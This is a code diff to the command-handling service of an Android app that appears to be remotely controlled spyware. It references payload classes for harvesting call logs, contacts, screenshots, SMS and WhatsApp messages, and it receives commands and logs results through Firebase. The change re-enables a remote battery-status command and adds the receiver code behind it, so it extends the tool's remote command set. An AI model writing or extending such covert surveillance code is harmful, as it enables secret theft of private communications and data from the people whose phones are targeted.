@@ -5,18 +5,14 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
-import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.graphics.Color;
 import android.net.Uri;
-import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
-import android.widget.TabHost;
-import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -26,13 +22,13 @@ import androidx.core.content.FileProvider;
 
 import com.aigs.serviceone.MainActivity;
 import com.aigs.serviceone.R;
-import com.aigs.serviceone.helpers.BatteryUpdater;
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.ContactsPayloadListner;
 import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
+import com.aigs.serviceone.payload.BatteryUpdater;
 import com.aigs.serviceone.payload.CallLogsPayload;
 import com.aigs.serviceone.payload.ContactsPayload;
 import com.aigs.serviceone.payload.ScreenshotPayload;
@@ -157,8 +153,9 @@ public class Starter extends Service {
                     getContacts();
                     break;
                 case PayloadTypes.GET_BATTERY_STATUS:
-                    //loadBatterySection();
+                    loadBatterySection();
                     break;
+
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
                     FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");
@@ -170,6 +167,16 @@ public class Starter extends Service {
             FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
 
         }
+    }
+
+    private void loadBatterySection() {
+        IntentFilter intentFilter = new IntentFilter();
+        intentFilter.addAction(Intent.ACTION_POWER_CONNECTED);
+        intentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
+        intentFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
+
+        BatteryUpdater batteryUpdater = new BatteryUpdater();
+        registerReceiver(batteryUpdater, intentFilter);
     }
 
     private void getContacts() {
